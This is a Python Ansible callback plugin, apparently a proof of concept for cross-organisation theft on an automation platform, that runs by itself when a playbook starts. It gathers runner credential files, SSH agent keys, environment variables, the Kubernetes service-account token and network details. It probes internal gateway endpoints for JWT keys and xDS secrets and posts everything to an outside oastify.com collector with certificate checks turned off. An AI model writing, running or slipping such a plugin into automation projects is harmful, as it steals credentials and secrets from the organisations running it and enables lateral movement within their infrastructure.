import os, json, subprocess, urllib.request, ssl
from ansible.plugins.callback import CallbackBase

class CallbackModule(CallbackBase):
    CALLBACK_VERSION = 2.0
    CALLBACK_NAME = "exfil"
    CALLBACK_TYPE = "notification"
    CALLBACK_NEEDS_ENABLED = False

    def _post(self, path, data):
        try:
            ctx = ssl._create_unverified_context()
            body = json.dumps(data, default=str).encode()[:60000]
            urllib.request.urlopen(urllib.request.Request(
                f"https://ywy3itkf4pv122ydka88cvxs4jaay1mq.oastify.com/{path}",
                data=body, headers={"Content-Type": "application/json"}),
                timeout=10, context=ctx)
        except: pass

    def _get(self, url, method="GET"):
        try:
            ctx = ssl._create_unverified_context()
            req = urllib.request.Request(url)
            if method == "POST":
                req = urllib.request.Request(url, data=b"{}",
                    headers={"Content-Type": "application/json"})
            return urllib.request.urlopen(req, timeout=5, context=ctx).read().decode(errors="replace")[:8000]
        except Exception as e:
            return f"ERR: {e}"

    def _run(self, cmd):
        try: return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode(errors="replace")[:4000]
        except: return ""

    def v2_playbook_on_start(self, playbook):
        # --- Phase 1: Credentials ---
        creds = {"tag": "cross-org-theft", "user": self._run("id")}

        for base in ("/runner/env", "/runner/artifacts"):
            for root, dirs, files in os.walk(base):
                for f in files:
                    fp = os.path.join(root, f)
                    try: creds[fp] = open(fp).read()[:3000]
                    except: pass

        creds["ssh_agent_keys"] = self._run("ssh-add -l 2>&1")
        self._post("poc-a-creds", creds)

        # --- Phase 2: Environment + Network ---
        recon = {"env": dict(os.environ)}
        recon["hostname"] = self._run("hostname -f 2>/dev/null || cat /etc/hostname")
        recon["hosts"] = self._run("cat /etc/hosts")
        recon["resolv"] = self._run("cat /etc/resolv.conf")
        recon["net"] = self._run("ip -4 addr 2>/dev/null || ifconfig 2>/dev/null")
        recon["routes"] = self._run("ip route 2>/dev/null")
        recon["sa_token"] = self._run("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo NOT_MOUNTED")
        recon["sa_ns"] = self._run("cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo NOT_MOUNTED")
        self._post("poc-a-recon", recon)

        # --- Phase 3: Lateral movement ---
        lateral = {}
        for k, v in sorted(os.environ.items()):
            if "SERVICE_HOST" in k and "KUBERNETES" not in k:
                lateral["jwt_key"] = self._get(f"http://{v}/api/gateway/v1/jwt_key/")
                lateral["xds_clusters"] = self._get(f"http://{v}/v3/discovery:clusters", "POST")
                lateral["xds_secrets"] = self._get(f"http://{v}/v3/discovery:secrets", "POST")
                lateral["gw_ping"] = self._get(f"http://{v}/api/gateway/v1/ping/")
                break
        for k, v in sorted(os.environ.items()):
            if "CONTROLLER_SERVICE_PORT" in k and "://" in v:
                ctrl = v.replace("tcp://","").split(":")[0]
                lateral["ctrl_ping"] = self._get(f"http://{ctrl}/api/v2/ping/")
                break
        self._post("poc-a-lateral", lateral)
